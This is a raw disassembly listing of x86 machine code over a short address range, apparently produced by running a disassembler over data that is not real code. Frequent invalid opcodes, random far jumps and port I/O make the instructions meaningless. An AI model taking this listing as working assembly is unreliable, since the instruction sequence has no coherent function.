  414920:	mov    ds:0x51180d2f,al
  414925:	das    
  414926:	inc    eax
  414927:	mov    BYTE PTR [eax+0x7b4f9200],bl
  41492d:	sbb    ebp,esp
  41492f:	sti    
  414930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414931:	adc    BYTE PTR [ecx],bl
  414933:	or     edx,DWORD PTR [edi+edi*4+0x66]
  414937:	pop    ecx
  414938:	(bad)  
  414939:	aas    
  41493a:	push   edx
  41493b:	in     eax,0xb5
  41493d:	and    al,0x8f
  41493f:	dec    esp
  414940:	inc    DWORD PTR [ebx+0x64b18453]
  414946:	(bad)  
  414947:	lods   eax,DWORD PTR ds:[esi]
  414948:	sbb    eax,0xaad2c665
  41494d:	pop    ds
  41494e:	adc    DWORD PTR [ebx-0x181eb175],ebx
  414954:	push   edi
  414955:	push   esi
  414956:	dec    esp
  414957:	neg    BYTE PTR [ebx+0x49]
  41495a:	jg     0x414931
  41495c:	xor    DWORD PTR [ecx-0x8356030],edx
  414962:	loopne 0x41491c
  414964:	mov    ah,0x7e
  414966:	nop
  414967:	sub    eax,DWORD PTR [edx-0x3f]
  41496a:	xchg   edi,eax
  41496b:	adc    ah,0x5f
  41496e:	pop    esi
  41496f:	adc    BYTE PTR ds:0x9ff0d919,dh
  414975:	fst    DWORD PTR [esi+esi*1]
  414978:	pop    sp
  41497a:	push   0x40
  41497c:	adc    edx,ebp
  41497e:	popf   
  41497f:	cmp    DWORD PTR [ebp-0x1aad42af],edx
  414985:	jg     0x4149ec
  414987:	pop    esp
  414988:	inc    esp
  414989:	retf   
  41498a:	enter  0x92b3,0xe4
  41498e:	dec    edi
  41498f:	(bad)  
  414990:	icebp  
  414991:	scas   al,BYTE PTR es:[edi]
  414992:	daa    
  414993:	pop    edi
  414994:	mov    ds:0x72ad7298,eax
  414999:	sbb    eax,0x10d4dd46
  41499e:	outs   dx,BYTE PTR ds:[esi]
  41499f:	or     BYTE PTR [esi-0x661ab131],dl
  4149a5:	outs   dx,DWORD PTR ds:[esi]
  4149a6:	mov    bh,0x4c
  4149a8:	push   ecx
  4149a9:	in     eax,0xc0
  4149ab:	mov    ah,0x4a
  4149ad:	adc    BYTE PTR [ebp+0xb4fda2c],bl
  4149b3:	out    dx,eax
  4149b4:	mov    BYTE PTR [edi],0x48
  4149b7:	enter  0x62b,0xce
  4149bb:	inc    ecx
  4149bc:	jg     0x4149e6
  4149be:	in     al,dx
  4149bf:	mov    cl,0xfb
  4149c1:	retf   0xb5ad
  4149c4:	aam    0x6e
  4149c6:	ja     0x4149cd
  4149c8:	pop    ebp
  4149c9:	das    
  4149ca:	push   edx
  4149cb:	mov    dl,0x4
  4149cd:	scas   eax,DWORD PTR es:[edi]
  4149ce:	jmp    0x9002:0x3618fbd3
  4149d5:	call   0x18e3e61f
  4149da:	or     BYTE PTR [edx-0x11374381],0x51
  4149e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149e2:	or     al,0xf5
  4149e4:	push   ebx
  4149e5:	and    DWORD PTR [ebx],esp
  4149e7:	pop    ebp
  4149e8:	int3   
  4149e9:	imul   ebx,DWORD PTR [ecx+0x3eaca036],0xffffff89
  4149f0:	loopne 0x4149ea
  4149f2:	aas    
  4149f3:	out    0xc1,al
  4149f5:	add    ah,BYTE PTR [edx+0x42]
  4149f8:	cmp    dl,ch
  4149fa:	mov    cl,0x2e
  4149fc:	jmp    0x1731780e
  414a01:	test   eax,0x9590625c
  414a06:	sar    BYTE PTR [ebx],0x7b
  414a09:	dec    esp
  414a0a:	pop    eax
  414a0b:	push   esp
  414a0c:	in     eax,dx
  414a0d:	jns    0x4149c9
  414a0f:	rol    DWORD PTR [ecx],1
  414a11:	pop    edx
  414a12:	xor    bh,0x48
  414a15:	std    
  414a16:	popa   
  414a17:	aas    
  414a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a19:	jbe    0x414a4c
  414a1b:	popf   
  414a1c:	fnstenv [eax]
  414a1e:	arpl   WORD PTR [edi+0x75],bx
  414a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a22:	neg    BYTE PTR [ebx+0x52ce6f38]
  414a28:	or     edi,DWORD PTR [edx+0x357c5b43]
  414a2e:	into   
  414a2f:	pushf  
  414a30:	fldenv [edi]
  414a32:	lds    edi,FWORD PTR [edi]
  414a34:	sub    dl,BYTE PTR [ecx-0x2f68bf83]
  414a3a:	xchg   edx,eax
  414a3b:	repnz inc esp
  414a3d:	or     ah,ah
  414a3f:	pop    ds
  414a40:	lock pop ebx
  414a42:	cmp    ecx,DWORD PTR [ebx-0x790b43a0]
  414a48:	loope  0x414a88
  414a4a:	mov    ebp,0x11694221
  414a4f:	call   0xd9aba8f9
  414a54:	xor    eax,0x7ad4b4a0
  414a59:	jb     0x414a26
  414a5b:	arpl   WORD PTR [edx-0x19],di
  414a5e:	imul   edi,DWORD PTR [bx+di+0x5f],0x1
  414a63:	fld    DWORD PTR gs:[ebx+0x43]
  414a67:	cli    
  414a68:	mov    eax,ds:0x2389606c
  414a6d:	adc    eax,0x124d2a95
  414a72:	mov    ebx,0xa6e5df83
  414a77:	imul   ecx,DWORD PTR [edx],0xffffffba
  414a7a:	mov    al,ds:0x54eb53c8
  414a7f:	push   eax
  414a80:	(bad)  
  414a81:	mov    bl,0xb3
  414a83:	adc    cl,BYTE PTR [esi]
  414a85:	fdivp  st(7),st
  414a87:	imul   esp,DWORD PTR [ebx],0x2f05eeb8
  414a8d:	mul    ebp
  414a8f:	and    dh,BYTE PTR [edx]
  414a91:	clc    
  414a92:	xor    bh,BYTE PTR [edi]
  414a94:	sar    ch,0x3b
  414a97:	sbb    al,0xb6
  414a99:	mul    DWORD PTR [ebx]
  414a9b:	test   al,0x74
  414a9d:	xchg   BYTE PTR [ecx+0x7c],dh
  414aa0:	cmc    
  414aa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aa2:	(bad)  
  414aa3:	pop    ebp
  414aa4:	sub    DWORD PTR [edx-0x36],esp
  414aa7:	or     eax,0x52069e7a
  414aac:	xchg   edx,eax
  414aad:	shl    DWORD PTR [ebp-0xed8e470],1
  414ab3:	pop    edi
  414ab4:	push   ss
  414ab5:	cmove  ebp,DWORD PTR [edi+0x2c]
  414ab9:	fadd   DWORD PTR [ebp-0x742af791]
  414abf:	mov    esp,0xa54d0afa
  414ac4:	xchg   DWORD PTR [ecx-0x382d588f],edx
  414aca:	add    al,0xb0
  414acc:	(bad)  
  414acd:	call   0x4d0d1c5a
  414ad2:	ret    
  414ad3:	inc    esp
  414ad4:	inc    esp
  414ad5:	out    dx,al
  414ad6:	jecxz  0x414aef
  414ad8:	call   0xdd63:0xc8af531d
  414adf:	pop    ds
  414ae0:	aas    
  414ae1:	retf   0x8cfd
  414ae4:	inc    ebx
  414ae5:	dec    ebp
  414ae6:	dec    eax
  414ae7:	inc    ebp
  414ae8:	or     edi,DWORD PTR [ecx+0x6e877da5]
  414aee:	xor    BYTE PTR [edi+0x2d],ch
  414af1:	out    dx,eax
  414af2:	fidiv  WORD PTR [eax+0x3a]
  414af5:	loop   0x414a98
  414af7:	mov    dl,0x63
  414af9:	fs aas 
  414afb:	pop    eax
  414afc:	jp     0x414add
  414afe:	mov    al,0x9c
  414b00:	nop
  414b01:	jo     0x414aa6
  414b03:	and    DWORD PTR [edi-0xe],0x5a
  414b07:	imul   esi,esp,0x68
  414b0a:	sub    bl,bh
  414b0c:	arpl   WORD PTR ds:0x6dfa7722,di
  414b12:	or     BYTE PTR [edi-0x16],ch
  414b15:	pop    DWORD PTR [esi]
  414b17:	cmp    ch,ah
  414b19:	adc    BYTE PTR [eax],ah
  414b1b:	mov    dl,0xa2
  414b1d:	dec    eax
  414b1e:	sti    
  414b1f:	mov    DWORD PTR [ecx-0x44857cdd],esi
  414b25:	push   ebx
  414b26:	mov    ebx,edi
  414b28:	into   
  414b29:	pop    eax
  414b2a:	mov    dh,0x3f
  414b2c:	mov    ch,0x37
  414b2e:	in     eax,dx
  414b2f:	sti    
  414b30:	jno    0x414b0d
  414b32:	pop    esi
  414b33:	enter  0x5d70,0x79
  414b37:	dec    ebp
  414b38:	cli    
  414b39:	ret    0x34af
  414b3c:	pop    ecx
  414b3d:	sar    DWORD PTR [ebx+eiz*1+0x372b422],cl
  414b44:	call   0x526:0xe5d69acb
  414b4b:	xchg   edi,eax
  414b4c:	inc    edi
  414b4d:	js     0x414b5b
  414b4f:	popf   
  414b50:	rol    ch,0xbb
  414b53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b54:	add    eax,ecx
  414b56:	xchg   esi,eax
  414b57:	sahf   
  414b58:	js     0x414b96
  414b5a:	jmp    0x8c8edaf3
  414b5f:	jns    0x414b6f
  414b61:	sbb    al,0xf1
  414b63:	test   DWORD PTR [edx-0x4c],0xb13115eb
  414b6a:	mov    ch,0xef
  414b6c:	mov    ecx,0x55d5240b
  414b71:	pop    edi
  414b72:	pop    ss
  414b73:	or     DWORD PTR [ebp+0x2e],edx
  414b76:	push   es
  414b77:	iret   
  414b78:	sbb    al,0xf8
  414b7a:	into   
  414b7b:	fsubr  QWORD PTR [ebx-0x4e78b491]
  414b81:	int3   
  414b82:	in     al,0x85
  414b84:	push   cs
  414b85:	addr16 cmp ecx,ecx
  414b88:	adc    eax,0xc2f2c4b9
  414b8d:	retf   0x5de5
  414b90:	in     al,dx
  414b91:	mov    edx,0x33b7cda1
  414b96:	or     BYTE PTR [eax+0xfeff6bb],dl
  414b9c:	mov    eax,0x19530081
  414ba1:	retf   
  414ba2:	cli    
  414ba3:	and    bh,BYTE PTR [ecx]
  414ba5:	out    dx,al
  414ba6:	or     al,ch
  414ba8:	inc    ebp
  414ba9:	xor    al,0xae
  414bab:	sbb    al,0x2b
  414bad:	std    
  414bae:	(bad)  
  414baf:	mov    ds,WORD PTR [ebx+0x2a]
  414bb2:	mov    edx,0xb996f395
  414bb7:	mov    DWORD PTR [edx+0x6c85ff03],esp
  414bbd:	mov    dh,0x40
  414bbf:	adc    al,0xe3
  414bc1:	enter  0x1cb8,0xdb
  414bc5:	mov    eax,0x7bee085d
  414bca:	inc    ebx
  414bcb:	push   ebp
  414bcc:	xor    DWORD PTR [esi],ebx
  414bce:	fadd   DWORD PTR [edx+eax*8]
  414bd1:	ds pop edx
  414bd3:	or     edx,DWORD PTR [eax]
  414bd5:	or     eax,0x6e416d53
  414bda:	sbb    bl,cl
  414bdc:	sbb    edi,DWORD PTR [ecx-0x4230b9]
  414be2:	lahf   
  414be3:	test   al,0x9f
  414be5:	out    0x6f,eax
  414be7:	mov    WORD PTR [edx],ss
  414be9:	or     bh,BYTE PTR [esi]
  414beb:	inc    ecx
  414bec:	cmp    eax,DWORD PTR [ecx]
  414bee:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  414bf0:	lods   al,BYTE PTR ds:[esi]
  414bf1:	mov    cl,0x48
  414bf3:	call   0x6a80:0x6f66f452
  414bfa:	dec    edi
  414bfb:	or     al,0xc8
  414bfd:	pusha  
  414bfe:	aad    0xce
  414c00:	mov    ds:0xe8065c5a,eax
  414c05:	fmulp  st(0),st
  414c07:	cld    
  414c08:	fld    DWORD PTR [ebp-0x5]
  414c0b:	adc    al,0x58
  414c0d:	jnp    0x414b9b
  414c0f:	jmp    0x4205f9b2
  414c14:	jge    0x414bf1
  414c16:	arpl   sp,sp
  414c18:	aaa    
  414c19:	mov    ds:0x866011c8,eax
  414c1e:	lods   al,BYTE PTR ds:[esi]
  414c1f:	out    0xbc,al
  414c21:	cld    
  414c22:	pop    esi
  414c23:	inc    eax
  414c24:	and    eax,0xdfa437cb
  414c29:	ins    BYTE PTR es:[edi],dx
  414c2a:	ror    BYTE PTR [ecx+0x5],0xa0
  414c2e:	or     al,BYTE PTR [edx]
  414c30:	cmp    bh,BYTE PTR [ecx+0x37]
  414c33:	loope  0x414bc0
  414c35:	out    dx,eax
  414c36:	sar    bl,0xa8
  414c39:	(bad)  
  414c3a:	retf   
  414c3b:	jmp    0x414bdc
  414c3d:	sub    DWORD PTR [edx*1-0x2001e421],esi
  414c44:	adc    DWORD PTR [edx-0x4967eb6a],edi
  414c4a:	xchg   DWORD PTR [ebx],ebx
  414c4c:	jo     0x414c3f
  414c4e:	sub    DWORD PTR [esi+0x59],esp
  414c51:	dec    ebp
  414c52:	mov    al,ds:0x763a9768
  414c57:	(bad)  
  414c58:	stc    
  414c59:	jp     0x414c5f
  414c5b:	psubusw mm4,mm1
  414c5e:	inc    ebx
  414c5f:	loopne 0x414bf5
  414c61:	loope  0x414bf9
  414c63:	jbe    0x414ccc
  414c65:	mov    dl,0x32
  414c67:	push   ds
  414c68:	jo     0x414c02
  414c6a:	mov    ds:0x7043f48f,eax
  414c6f:	pop    es
  414c70:	or     bl,BYTE PTR ds:0xe8935a77
  414c76:	in     eax,dx
  414c77:	jns    0x414ce3
  414c79:	jge    0x414c4c
  414c7b:	scas   al,BYTE PTR es:[edi]
  414c7c:	adc    eax,0x70c8131d
  414c81:	nop
  414c82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c83:	lods   eax,DWORD PTR ds:[esi]
  414c84:	sub    DWORD PTR [eax],edi
  414c86:	sbb    bh,BYTE PTR [ebp-0x11a788ca]
  414c8c:	je     0x414cc2
  414c8e:	adc    ecx,DWORD PTR [esi+ebx*4]
  414c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c92:	sub    ch,dh
  414c94:	jbe    0x414cb0
  414c96:	out    0xa9,al
  414c98:	das    
  414c99:	out    dx,eax
  414c9a:	test   al,0x6c
  414c9c:	add    eax,0xab3c9553
  414ca1:	mov    esp,esi
  414ca3:	sbb    DWORD PTR [ebx],edi
  414ca5:	imul   ecx,ebx,0xb
  414ca8:	pop    edi
  414ca9:	arpl   sp,bx
  414cab:	push   ss
  414cac:	fiadd  WORD PTR [edx+0x3b8855dd]
  414cb2:	scas   eax,DWORD PTR es:[edi]
  414cb3:	int    0x56
  414cb5:	div    BYTE PTR [ecx]
  414cb7:	popf   
  414cb8:	cmp    ah,cl
  414cba:	push   ebx
  414cbb:	lahf   
  414cbc:	rcr    BYTE PTR [esp+ecx*1+0x62],0x4c
  414cc1:	icebp  
  414cc2:	cmp    esp,edx
  414cc4:	aas    
  414cc5:	outs   dx,DWORD PTR ds:[esi]
  414cc6:	mov    eax,0xa38754df
  414ccb:	add    DWORD PTR [ebx],edx
  414ccd:	(bad)  
  414cce:	mov    cl,0x5c
  414cd0:	fadd   QWORD PTR [esi]
  414cd2:	xchg   ebp,eax
  414cd3:	call   0x73ab:0x6aafad03
  414cda:	neg    DWORD PTR [esp+eax*4]
  414cdd:	in     eax,0xc4
  414cdf:	or     eax,0x13ed7adc
  414ce4:	call   0xe53762a5
  414ce9:	jl     0x414cc9
  414ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cec:	fisubr WORD PTR [edi+0x4f28ec46]
  414cf2:	pop    ebp
  414cf3:	leave  
  414cf4:	aas    
  414cf5:	rol    BYTE PTR [edx],0x14
  414cf8:	jmp    0x78b3aee4
  414cfd:	sub    ebx,DWORD PTR [ecx+0x50]
  414d00:	mov    ds:0xdb01ef4e,eax
  414d05:	icebp  
  414d06:	xlat   BYTE PTR ds:[ebx]
  414d07:	mov    dl,0x6f
  414d09:	pop    es
  414d0a:	iret   
  414d0b:	mov    ah,0xf3
  414d0d:	adc    BYTE PTR [edi+edx*4-0x7e],bh
  414d11:	add    edi,esi
  414d13:	dec    ecx
  414d14:	arpl   WORD PTR [ebp+0x48bd8c32],bx
  414d1a:	(bad)  
  414d1b:	or     BYTE PTR ds:0x1ca905fa,ah
  414d21:	push   esi
  414d22:	lea    ecx,[esp+esi*8+0x3b]
  414d26:	in     al,dx
  414d27:	adc    eax,0x3ec932ed
  414d2c:	in     al,dx
  414d2d:	retf   0xbaa1
  414d30:	mov    al,0xdb
  414d32:	nop
  414d33:	retf   0x1bac
  414d36:	cmp    ch,BYTE PTR [ecx-0x2f]
  414d39:	jge    0x414d5e
  414d3b:	xchg   esp,eax
  414d3c:	out    0x1c,al
  414d3e:	mov    al,0x87
  414d40:	add    al,0x73
  414d42:	push   ds
  414d43:	xor    bh,dl
  414d45:	xor    al,0x50
  414d47:	jno    0x414d82
  414d49:	out    dx,eax
  414d4a:	cmp    al,0x8d
  414d4c:	push   ds
  414d4d:	out    0x45,al
  414d4f:	inc    esi
  414d50:	shl    DWORD PTR [edi-0x154058fe],1
  414d56:	ud0    eax,DWORD PTR [esi+0x59]
  414d5a:	and    DWORD PTR [edx],esi
  414d5c:	mov    ecx,0xa883be7d
  414d61:	(bad)  
  414d62:	dec    edi
  414d63:	out    0x3b,eax
  414d65:	fxtract 
  414d67:	test   eax,0xcf62ff09
  414d6c:	mov    BYTE PTR [edi],bh
  414d6e:	xor    BYTE PTR [esi+edi*1+0xcc392d0],dh
  414d75:	cli    
  414d76:	mov    edi,0x28bb49d2
  414d7b:	dec    ecx
  414d7c:	xchg   esi,eax
  414d7d:	nop
  414d7e:	inc    ecx
  414d7f:	in     eax,0x96
  414d81:	inc    esi
  414d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d83:	mov    gs,esp
  414d85:	clc    
  414d86:	imul   ecx,DWORD PTR ds:0x8b209e82,0x3a058fa2
  414d90:	cdq    
  414d91:	mov    bh,0x33
  414d93:	pop    eax
  414d94:	jne    0x414d55
  414d96:	jne    0x414d39
  414d98:	push   cs
  414d99:	ja     0x414da6
  414d9b:	jno    0x414d95
  414d9d:	test   cl,dl
  414d9f:	sub    edi,DWORD PTR [eax+0x4f01627c]
  414da5:	mov    edi,0xa81de538
  414daa:	mov    cl,0x57
  414dac:	fcmovbe st,st(3)
  414dae:	mov    eax,0xe033213c
  414db3:	mov    ds:0xa6fb3861,al
  414db8:	jg     0x414dda
  414dba:	lods   al,BYTE PTR ds:[esi]
  414dbb:	or     eax,0xa9678574
  414dc0:	in     al,dx
  414dc1:	arpl   WORD PTR [eax],sp
  414dc3:	fisub  WORD PTR [ecx]
  414dc5:	leave  
  414dc6:	ja     0x414e1c
  414dc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dc9:	popf   
  414dca:	pushf  
  414dcb:	enter  0x1854,0xc6
  414dcf:	bound  edi,QWORD PTR [ebp-0x67]
  414dd2:	cmp    eax,0x8308a860
  414dd7:	imul   ebp,DWORD PTR [eax-0x8],0x120e28e
  414dde:	jae    0x414d77
  414de0:	xchg   esp,eax
  414de1:	pop    ds
  414de2:	mov    eax,ds:0xbacdcc50
  414de7:	sub    ecx,DWORD PTR [edx-0x7]
  414dea:	mov    ch,0x1e
  414dec:	leave  
  414ded:	push   ecx
  414dee:	pop    esi
  414def:	lahf   
  414df0:	adc    bl,BYTE PTR ds:0x3c25d852
  414df6:	(bad)  
  414df7:	lods   eax,DWORD PTR ds:[esi]
  414df8:	loope  0x414d8f
  414dfa:	cli    
  414dfb:	dec    ebp
  414dfc:	mov    bl,0x9f
  414dfe:	shl    BYTE PTR [esi+0x47],0x17
  414e02:	or     ebp,DWORD PTR [eax-0x61]
  414e05:	shl    dh,0x58
  414e08:	inc    ecx
  414e09:	cs test al,0x78
  414e0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e0d:	jg     0x414e22
  414e0f:	xchg   esp,eax
  414e10:	nop
  414e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e12:	adc    ah,BYTE PTR [eax-0x429e8b41]
  414e18:	enter  0xc761,0xec
  414e1c:	stc    
  414e1d:	(bad)  
  414e1e:	rol    DWORD PTR [ebx-0x67],0xf4
  414e22:	adc    dh,0x9a
  414e25:	aad    0x8d
  414e27:	adc    eax,0xafcbeb1a
  414e2c:	xlat   BYTE PTR ds:[ebx]
  414e2d:	int    0x47
  414e2f:	jle    0x414dbc
  414e31:	push   0xffffff96
  414e33:	scas   al,BYTE PTR es:[edi]
  414e34:	int    0x59
  414e36:	aaa    
  414e37:	cmp    ah,dl
  414e39:	and    DWORD PTR [edi-0x6d],edx
  414e3c:	std    
  414e3d:	dec    esp
  414e3e:	and    al,0xb3
  414e40:	inc    esi
  414e41:	sbb    cl,BYTE PTR [edx-0x30190248]
  414e47:	sti    
  414e48:	in     al,0x5b
  414e4a:	stc    
  414e4b:	push   ebp
  414e4c:	imul   esp,DWORD PTR [eax+0x40],0x5
  414e50:	push   cs
  414e51:	nop
  414e52:	jno    0x414ed3
  414e54:	adc    eax,0x459b94eb
  414e59:	dec    edx
  414e5a:	ins    BYTE PTR es:[edi],dx
  414e5b:	pop    edx
  414e5c:	inc    esp
  414e5d:	jmp    0x7546c577
  414e62:	rol    edx,1
  414e64:	(bad)
  414e67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e68:	in     eax,dx
  414e69:	enter  0x7c43,0x43
  414e6d:	xchg   edi,eax
  414e6e:	sub    edx,ecx
  414e70:	jnp    0x414ea0
  414e72:	shl    BYTE PTR [ebx-0x22],1
  414e75:	xor    edi,edx
  414e77:	leave  
  414e78:	xor    al,cl
  414e7a:	xor    dh,al
  414e7c:	jb     0x414efc
  414e7e:	and    DWORD PTR [edx-0x6861d2aa],eax
  414e84:	in     al,0xa0
  414e86:	mov    edi,edi
  414e88:	mov    ds:0x8029ebc5,eax
  414e8d:	pushf  
  414e8e:	repz fadd QWORD PTR [ebx]
  414e91:	mov    ecx,0x3b16cea7
  414e96:	push   esi
  414e97:	pop    ds
  414e98:	push   eax
  414e99:	cmp    BYTE PTR [edx],cl
  414e9b:	xor    ebx,DWORD PTR [edi-0x29623d2f]
  414ea1:	jge    0x414e8e
  414ea3:	call   0x9a292585
  414ea8:	xor    DWORD PTR [ecx+0x35],0x245271d0
  414eaf:	xor    esi,DWORD PTR [esi]
  414eb1:	das    
  414eb2:	sub    BYTE PTR [ebx-0x42263156],dh
  414eb8:	in     al,dx
  414eb9:	je     0x414e4b
  414ebb:	push   edx
  414ebc:	push   esi
  414ebd:	xchg   ebp,eax
  414ebe:	push   es
  414ebf:	bound  esp,QWORD PTR [esi]
  414ec1:	rcr    DWORD PTR [edi+ebx*2],cl
  414ec4:	or     DWORD PTR [edx+0x46a322a4],edi
  414eca:	ins    BYTE PTR es:[edi],dx
  414ecb:	fld    DWORD PTR [eax]
  414ecd:	lods   eax,DWORD PTR ds:[esi]
  414ece:	jle    0x414f26
  414ed0:	sti    
  414ed1:	xor    al,0x5e
  414ed3:	add    al,0x49
  414ed5:	jp     0x414e8a
  414ed7:	sahf   
  414ed8:	xlat   BYTE PTR ds:[ebx]
  414ed9:	mov    ds:0x6365a41,al
  414ede:	out    0xe8,eax
  414ee0:	daa    
  414ee1:	mov    ds:0xb7bf247a,al
  414ee6:	bound  edi,QWORD PTR [edi]
  414ee8:	xchg   esp,eax
  414ee9:	push   ebp
  414eea:	cmp    edx,esi
  414eec:	adc    esp,DWORD PTR ds:0xf35124ed
  414ef2:	enter  0x4e6b,0x2a
  414ef6:	lock sbb DWORD PTR [edi],esi
  414ef9:	ins    DWORD PTR es:[edi],dx
  414efa:	nop
  414efb:	out    0xda,al
  414efd:	jmp    0x2e5:0xea5c815
  414f04:	test   ch,cl
  414f06:	push   ecx
  414f07:	retf   
  414f08:	data16 add BYTE PTR [esp+0x51b82719],bh
  414f10:	test   al,0x3b
  414f12:	stc    
  414f13:	icebp  
  414f14:	(bad)  
  414f15:	mov    DWORD PTR ss:[esi-0x3d],edx
  414f19:	jg     0x414ea3
  414f1b:	scas   eax,DWORD PTR es:[edi]
  414f1c:	mov    bh,0x56
  414f1e:	popa   
  414f1f:	add    esi,esp
  414f21:	in     al,0xb0
  414f23:	imul   eax,esp,0x31eaf9f9
  414f29:	(bad)  
  414f2a:	xor    dh,dh
  414f2c:	popf   
  414f2d:	jne    0x414fa9
  414f2f:	imul   edi,DWORD PTR [esi],0x15
  414f32:	pushf  
  414f33:	mov    dh,0x2a
  414f35:	or     dl,BYTE PTR [eax-0x38]
  414f38:	cmp    DWORD PTR [esi+0x58601dd],ecx
  414f3e:	adc    al,0xe8
  414f40:	adc    ecx,DWORD PTR [edi]
  414f42:	shr    BYTE PTR [esi+0x7f],0x55
  414f46:	mul    BYTE PTR [ebp-0x3da51e13]
  414f4c:	rol    BYTE PTR [eax-0x43],0xb0
  414f50:	push   ss
  414f51:	imul   edi,DWORD PTR [ebp-0x76],0x0
  414f55:	xlat   BYTE PTR ds:[ebx]
  414f56:	popa   
  414f57:	sahf   
  414f58:	adc    al,0xad
  414f5a:	xchg   eax,esi
  414f5c:	shr    DWORD PTR ds:0x95a6ab8e,0x8c
  414f63:	cmp    al,0xb2
  414f65:	mov    dh,0x4
  414f67:	mov    dl,0xa9
  414f69:	aam    0x3d
  414f6b:	mov    edi,0xe0258d02
  414f70:	or     BYTE PTR [eax-0x5b],bh
  414f73:	inc    edi
  414f74:	push   edx
  414f75:	out    dx,al
  414f76:	out    0xe4,al
  414f78:	mov    edi,0x5d588f5e
  414f7d:	or     BYTE PTR [ebp+0x6],ah
  414f80:	ficom  DWORD PTR [ecx+0xa]
  414f83:	cmp    DWORD PTR [ebx+0x34],ebp
  414f86:	add    ebp,DWORD PTR [edx-0x3b]
  414f89:	adc    esi,ebp
  414f8b:	lahf   
  414f8c:	popa   
  414f8d:	jge    0x414f17
  414f8f:	pusha  
  414f90:	dec    esp
  414f91:	addr16 or eax,0xaef87c17
  414f97:	xchg   esp,eax
  414f98:	out    0x32,al
  414f9a:	cmp    DWORD PTR ds:0x9b41846a,ecx
  414fa0:	daa    
  414fa1:	or     eax,0x473d126d
  414fa6:	lods   al,BYTE PTR ds:[esi]
  414fa7:	jbe    0x415009
  414fa9:	mov    ebx,0x685a5734
  414fae:	or     DWORD PTR [eax-0x4e6736cd],eax
  414fb4:	rcr    BYTE PTR [edi],cl
  414fb6:	mov    dh,0x15
  414fb8:	jmp    0x414f3e
  414fba:	and    bl,BYTE PTR [eax-0xc23e997]
  414fc0:	sub    bh,BYTE PTR [eax-0x1b]
  414fc3:	fucom  st(4)
  414fc5:	rcl    BYTE PTR [edx],cl
  414fc7:	mov    eax,0x2de028fc
  414fcc:	dec    eax
  414fcd:	(bad)  [eax-0x56]
  414fd0:	push   ds
  414fd1:	inc    esp
  414fd2:	(bad)  
  414fd3:	nop
  414fd4:	and    al,0xf7
  414fd6:	fcomp  QWORD PTR [eax-0x68]
  414fd9:	ror    BYTE PTR ds:0x8efd9e9d,1
  414fdf:	mov    al,0xd8
  414fe1:	jg     0x41500b
  414fe3:	shl    BYTE PTR [edi+0x3dee7a9b],cl
  414fe9:	cmp    DWORD PTR [edx],edx
  414feb:	sub    DWORD PTR [eax+0x17],edi
  414fee:	jge    0x414ffa
  414ff0:	retf   0xdbf7
  414ff3:	mov    DWORD PTR [eax],edx
  414ff5:	enter  0x4890,0x1d
  414ff9:	pop    ecx
  414ffa:	inc    ecx
  414ffb:	push   ss
  414ffc:	add    al,0xf4
  414ffe:	es das 
  415000:	xchg   esi,eax
  415001:	xchg   ebx,eax
  415002:	fcmovne st,st(0)
  415004:	fs inc ebp
  415006:	and    eax,0x8e1590a1
  41500b:	mov    edx,0x2dfaf06f
  415010:	(bad)  
  415011:	addr16 in eax,dx
  415013:	js     0x41507d
  415015:	call   0x8cc01b03
  41501a:	or     DWORD PTR [ecx-0x39],eax
  41501d:	stos   DWORD PTR es:[edi],eax
  41501e:	mov    al,0xdf
  415020:	xor    DWORD PTR [ebx-0x5613fd12],0xcb7f764e
  41502a:	lahf   
  41502b:	or     edx,DWORD PTR [eax-0x72]
  41502e:	cdq    
  41502f:	xchg   DWORD PTR [edi],edi
  415031:	jle    0x41509b
  415033:	iret   
  415034:	pop    ss
  415035:	jo     0x415005
  415037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415038:	rol    BYTE PTR [edx],1
  41503a:	inc    esi
  41503b:	fcom   DWORD PTR [ecx-0x21074bfb]
  415041:	xchg   edi,eax
  415042:	popa   
  415043:	sbb    eax,0xca221bfc
  415048:	enter  0xd887,0x4b
  41504c:	es push ebx
  41504e:	mov    edx,0xf9e44756
  415053:	push   esi
  415054:	inc    ebx
  415055:	scas   al,BYTE PTR es:[edi]
  415056:	sbb    BYTE PTR [edx-0x2982edb4],cl
  41505c:	out    dx,al
  41505d:	mov    edi,0x4c206328
  415062:	ins    DWORD PTR es:[edi],dx
  415063:	sub    eax,0x5d67037e
  415068:	mov    edi,0xd18e9c5c
  41506d:	aad    0x7f
  41506f:	sub    esp,DWORD PTR [edi]
  415071:	(bad)  
  415072:	fnsave [edx-0x33678466]
  415078:	sbb    esp,edx
  41507a:	xor    eax,0xbbc6f608
  41507f:	dec    ecx
  415080:	add    eax,0xd61160ca
  415085:	lods   al,BYTE PTR ds:[esi]
  415086:	loopne 0x41502d
  415088:	dec    esi
  415089:	sti    
  41508a:	pop    eax
  41508b:	pop    ecx
  41508c:	jbe    0x4150c3
  41508e:	add    DWORD PTR [edi-0x5df1b4be],ebp
  415094:	jbe    0x4150b4
  415096:	test   eax,0x76df022b
  41509b:	les    eax,FWORD PTR [edi-0x1f12894d]
  4150a1:	xor    bh,bl
  4150a3:	xchg   bl,dl
  4150a5:	stc    
  4150a6:	(bad)  
  4150a7:	cs loop 0x415053
  4150aa:	or     ch,BYTE PTR [ebp-0x61]
  4150ad:	out    dx,al
  4150ae:	in     eax,0xf3
  4150b0:	arpl   WORD PTR [edi+0xf],dx
  4150b3:	test   eax,0x66649618
  4150b8:	pop    ecx
  4150b9:	cmp    BYTE PTR [ebp-0x45f913ac],0x53
  4150c0:	xchg   ebp,eax
